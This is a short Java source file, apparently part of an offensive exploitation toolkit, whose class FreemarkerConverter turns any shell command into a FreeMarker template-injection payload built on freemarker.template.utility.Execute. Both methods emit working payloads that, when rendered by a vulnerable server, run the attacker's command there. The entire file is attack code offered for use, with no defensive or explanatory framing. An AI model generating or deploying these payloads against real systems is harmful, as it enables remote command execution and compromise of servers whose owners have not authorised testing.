package com.h2tg.ysogate.bullet.defineClass;

public class FreemarkerConverter
{

    public static String fm2cmd(String cmd)
    {
        String code = "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\""+cmd+"\")}";
        return code;
    }

    public static String fm2cmd2(String cmd)
    {
        String code="${\"freemarker.template.utility.Execute\"?new()(\""+cmd+"\")}";
        return code;
    }
}
